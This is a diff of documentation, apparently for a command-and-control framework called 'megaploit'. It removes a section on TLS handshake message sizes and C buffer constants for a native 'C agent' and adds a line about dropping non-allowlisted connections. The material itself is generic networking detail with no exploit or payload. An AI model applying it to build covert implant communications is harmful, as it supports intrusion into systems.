-<p>The cipher suite restriction (<code>ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20</code>) means every session uses an <strong>ephemeral (EC)DH key exchange</strong> — a fresh keypair is generated per connection, so the handshake includes a <code>ServerKeyExchange</code> message carrying the server's ECDHE public key signed with the long-term RSA-4096 cert key. That makes the server's opening flight the largest thing you will ever receive in a single burst.</p>
-<p><strong>Per-message size breakdown:</strong></p>
-<table>
-<thead>
-<tr>
-<th>TLS message</th>
-<th>Direction</th>
-<th>Typical size</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>ClientHello</code></td>
-<td>Client → Server</td>
-<td>200–350 bytes</td>
-</tr>
-<tr>
-<td><code>ServerHello</code></td>
-<td>Server → Client</td>
-<td>~80 bytes</td>
-</tr>
-<tr>
-<td><code>Certificate</code> (RSA-4096 self-signed)</td>
-<td>Server → Client</td>
-<td><strong>~1,900 bytes</strong></td>
-</tr>
-<tr>
-<td><code>ServerKeyExchange</code> (ECDHE pub key + RSA-4096 signature)</td>
-<td>Server → Client</td>
-<td>~350–512 bytes</td>
-</tr>
-<tr>
-<td><code>ServerHelloDone</code></td>
-<td>Server → Client</td>
-<td>4 bytes</td>
-</tr>
-<tr>
-<td><code>ClientKeyExchange</code> (ECDHE client pub key)</td>
-<td>Client → Server</td>
-<td>~70 bytes</td>
-</tr>
-<tr>
-<td><code>ChangeCipherSpec</code> + <code>Finished</code></td>
-<td>Both directions</td>
-<td>~90 bytes each</td>
-</tr>
-</tbody>
-</table>
-<p>The server may coalesce <code>ServerHello + Certificate + ServerKeyExchange + ServerHelloDone</code> into a single TCP segment. That burst peaks at roughly <strong>2,500 bytes</strong>, well within 8 KiB.</p>
-<p><strong>Allocate these buffers in your C agent</strong> (all defined in <a href="../plugins/native_sdk/megaploit_protocol.h"><code>megaploit_protocol.h</code></a>):</p>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="cm">/* TLS handshake buffers */</span>
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="cp">#define TLS_BUF_RECORD        16384   </span><span class="cm">/* RFC 5246 §6.2.1 hard cap per record          */</span>
-</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="cp">#define TLS_BUF_SERVER_FLIGHT  8192   </span><span class="cm">/* server handshake burst: cert + KX + done     */</span>
-</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="cp">#define TLS_BUF_CLIENT_HELLO   1024   </span><span class="cm">/* ClientHello with all required extensions      */</span>
-</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>
-</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="cm">/* Post-handshake application buffers */</span>
-</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="cp">#define C2_APP_BUF            65536   </span><span class="cm">/* matches config.py:BUFFER_SIZE (64 KiB)        */</span>
-</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="cp">#define MP_MAX_MSG    (256*1024*1024) </span><span class="cm">/* matches config.py:MAX_PLUGIN_MSG_SIZE (256 MiB) */</span>
-</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">                                      </span><span class="cm">/* reject any frame header larger than this       */</span>
-</span></code></pre></div>
-<p>If you are using <strong>OpenSSL</strong> (<code>SSL_connect</code> / <code>SSL_read</code> / <code>SSL_write</code>), OpenSSL manages all internal TLS record buffers itself. You only need to size your application-layer read buffer — use <code>C2_APP_BUF</code> (65,536) for normal traffic and <code>MP_MAX_MSG</code> as the sanity ceiling before allocating a receive buffer for an incoming frame.</p>
-<p>If you are calling <code>recv()</code> directly on the raw socket and parsing TLS records yourself, <code>TLS_BUF_SERVER_FLIGHT</code> (8,192) is sufficient for the largest inbound handshake flight, and <code>TLS_BUF_RECORD</code> (16,384) is the safe ceiling for any single TLS record from a conformant peer.</p>
-<p>A complete C/C++ single-header implementation of all these layers is available in <a href="../plugins/native_sdk/megaploit_protocol.h"><code>plugins/native_sdk/megaploit_protocol.h</code></a>.</p>
+<p>Any connection from a non-allowlisted IP is silently dropped.</p>
 
 
 
